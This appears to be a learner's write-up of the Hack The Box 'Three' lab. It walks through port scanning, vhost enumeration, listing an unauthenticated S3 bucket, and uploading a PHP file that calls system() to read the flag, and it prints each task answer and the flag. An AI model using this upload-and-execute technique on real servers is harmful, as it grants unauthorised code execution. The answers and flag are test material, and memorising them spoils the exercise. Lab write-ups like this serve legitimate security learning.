
# Starting Point / Three
**Target:** `10.129.21.251`

---

## Task 1 - How many TCP ports are open?

Run nmap across all ports

```bash
nmap -T5 -p- 10.129.21.251
```

`-p-` scans every port and `-T5` speeds things up so we don't wait forever and its HTB

```
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
2533/tcp  filtered snifferserver
4151/tcp  filtered menandmice_noh
28646/tcp filtered unknown
33291/tcp filtered unknown
38075/tcp filtered unknown
50513/tcp filtered unknown
62840/tcp filtered unknown
```

Only 22 and 80 are actually open

**Answer: 2**

---

## Task 2 - What is the domain of the email address in the "Contact" section?

Just go to the site and look at the Contact section

**Answer:** `thetoppers.htb`

---

## Task 3 - Which Linux file resolves hostnames to IP addresses without a DNS server?

The `/etc/hosts` file handles local hostname resolution. Entries look like:

```
10.129.21.251   thetoppers.htb
```

**Answer:** `/etc/hosts`

---

## Task 4 - Which sub-domain is discovered during further enumeration?

Running `dirb` and `ffuf` against the web root didn't turn up anything useful, just `/index.php` and `/images/`. I had to get some help for this one, and ended up switching to `gobuster` with vhost mode:

```bash
gobuster vhost --append-domain -u http://thetoppers.htb \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
```

Almost instantly finds one:

**Answer:** `s3.thetoppers.htb`

Add it to `/etc/hosts`, then visit `http://s3.thetoppers.htb/`. It returns a JSON response showing that the service is running

---

## Task 5 - What is the name of the service running on the discovered sub-domain?

The `s3` in the subdomain name is the giveaway. This is a locally hosted Amazon S3 endpoint:

**Answer:** `Amazon S3`

---

## Task 6 - Which command line utility can interact with the service on the discovered sub-domain?

https://repost.aws/questions/QU6V-VxzDqRS-5gMHvmKLrHQ/how-to-setup-subdomain-for-s3-bucket
https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/get-started-cli-tutorial.html

The standard CLI tool for working with S3 is `awscli`

**Answer:** `awscli`

---

## Task 7 - Which command sets up the AWS CLI?

https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html

Install it first:

```bash
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
sudo ./aws/install
```

Then run the setup command. Since this S3 instance has no real auth, I just used random words for the credentials:

```bash
aws configure

AWS Access Key ID [****************hats]: 
AWS Secret Access Key [****************oing]: 
Default region name [on]: 
Default output format [chat]: 
```

**Answer:** `aws configure`

---

## Task 8 - What command lists all S3 buckets?

https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-options.html:

```
Most command line options are simple strings, such as the profile name profile1 in the following example:
$ aws s3 ls --profile profile1
```



**Answer:** `aws s3 ls`

---

## Task 9 - What web scripting language is this server configured to run?

List what's inside the bucket:

```bash
aws s3 ls --endpoint-url http://s3.thetoppers.htb
# 2026-05-29 17:39:25 thetoppers.htb

aws s3 ls --endpoint-url http://s3.thetoppers.htb thetoppers.htb
#                            PRE images/
# 2026-05-29 17:39:25          0 .htaccess
# 2026-05-29 17:39:25      11952 index.php
```

`index.php` gives it away:

**Answer:** `PHP`

---

## Flag time

Did some digging but was able to push files to the S3 bucket.

Sinc it's serving as the web root for `thetoppers.htb`, anything uploaded there gets served by the web server. 

Since the server runs PHP, uploading a PHP file means it gets executed when you visit it:

**Step 1:** Write a quick PHP file that reads the flag:

```php
<?php
  system("ls /var/www");
  system("cat /var/www/flag.txt");
?>
```

**Step 2:** Upload it to the bucket:

```bash
aws s3 cp test.php --endpoint-url http://s3.thetoppers.htb s3://thetoppers.htb
```

**Step 3:** Hit it with curl to trigger execution (or just go to the URL, i just didn't take screenshots so i'm backfilling the info)
```bash
curl http://thetoppers.htb/test.php
```

**Output:**
```
flag.txt
html
a980d99281a28d638ac68b9bf9453c2b
```

**Flag:** `a980d99281a28d638ac68b9bf9453c2b`